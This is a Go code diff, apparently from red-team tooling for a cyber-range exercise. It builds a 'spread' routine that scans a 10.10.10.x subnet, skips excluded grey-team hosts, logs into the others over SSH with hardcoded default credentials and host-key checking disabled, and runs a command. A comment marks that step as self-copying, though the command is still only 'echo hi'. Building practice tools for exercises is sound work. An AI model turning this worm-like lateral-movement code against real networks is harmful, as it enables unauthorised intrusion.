@@ -6,6 +6,7 @@ import (
 	"unicode"
 	"net"
 	"sync"
+	"golang.org/x/crypto/ssh"
 )
 
 type Platform struct {
@@ -56,11 +57,35 @@ func reverse_lookup_hosts(subnet string) []string {
 }
 
 
-func winRM_to_host(host_ip string){
+func establish_winRM(host_ip string){
 
 }
 
-func SSH_to_host(host_ip string){
+func establish_SSH(host_ip, username, pswd string) (*ssh.Client, error){
+	config := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(pswd),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+
+	client, err := ssh.Dial("tcp", host_ip + ":22", config)
+	if err != nil {
+		return nil, err
+	}
+
+	return client, nil
+}
+
+func run_SSH_cmds(ssh_client *ssh.Client, cmd string) error {
+	session, err := ssh_client.NewSession()
+	if err != nil {
+		return err
+	}
+	defer session.Close()
+
+	return session.Run(cmd)
 
 }
 
@@ -84,29 +109,43 @@ func spread() {
 		"10.10.100.108",
 	}
 
-	// Grey team systems
+	// Grey team systems that have to be excluded
 	for i := 200; i < 255; i++ {
-		exclusion_list = append(exclusion_list, fmt.Sprintf("%s.%d", "10.10.10.", i))
+		exclusion_list = append(exclusion_list, fmt.Sprintf("%s.%d", "10.10.10", i))
 	} 
 
-	fmt.Println(exclusion_list)
-	// exclusion_map := make(map[string]bool)
-	// for _, ip := range exclusion_list {
-	// 	exclusion_map[ip] = true
-	// }
+	exclusion_map := make(map[string]bool)
+	for _, ip := range exclusion_list {
+		exclusion_map[ip] = true
+	}
 
-	// target_hosts := reverse_lookup_hosts("10.10.10")
+	target_hosts := reverse_lookup_hosts("10.10.10")
 
-	// for _, host_ip := range target_hosts {
-	// 	if 
-	// } 
+	for _, host_ip := range target_hosts {
 
-	// for _, host_ip := range target_hosts {
+		// Skip IPs that are not in target scope
+		if exclusion_map[host_ip] {
+			continue
+		}
 
-	// 	winRM_to_host(host_ip)
-	// 	SSH_to_host(host_ip)
+		// Brute force connect to IPs via SSH or WinRM
+		
+		// WinRM
+		establish_winRM(host_ip)
+		
 
-	// } 
+		// SSH
+		client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
+		if err != nil {
+			fmt.Println("Failed to SSH to: " + host_ip) // debugging
+			return
+		}
+		defer client.Close()
+
+		// Command to copy itself to new host
+		run_SSH_cmds(client, "echo hi")
+
+	} 
 
 }
 
